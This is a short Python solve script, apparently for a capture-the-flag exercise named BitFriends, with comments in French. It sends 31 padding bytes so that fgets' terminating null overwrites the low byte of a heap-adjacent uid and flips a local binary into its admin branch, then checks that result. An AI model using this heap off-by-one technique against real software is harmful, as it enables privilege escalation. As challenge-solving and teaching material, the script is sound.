#!/usr/bin/env python3
"""BitFriends — simple overflow : 31 octets de remplissage ecrasent le byte
de poids faible de `uid` (second malloc, heap contigu) avec le '\\0' terminal
de fgets, zero-ant uid -> branche "admin".

Usage : overflow-solve.py [-q] [--check]
"""
import argparse
import subprocess
import sys
from pathlib import Path

EXE = Path(__file__).resolve().parent.parent / "original" / "a.out"
PAYLOAD = "A" * 31


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("-q", action="store_true", help="n'affiche que le payload")
    ap.add_argument("--check", action="store_true", help="rejoue le binaire d'origine")
    a = ap.parse_args()
    if a.q:
        print(PAYLOAD)
        return 0
    print(f"payload ({len(PAYLOAD)} octets) = {PAYLOAD!r}")
    if a.check:
        run = lambda s: subprocess.run([str(EXE)], input=s + "\n", capture_output=True, text=True).stdout
        ok = run(PAYLOAD)
        ko = run("A" * 30)
        good = "admin" in ok and "user" in ko
        print("OK (31 'A'):", ok.strip().splitlines()[-1])
        print("KO (30 'A'):", ko.strip().splitlines()[-1])
        return 0 if good else 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
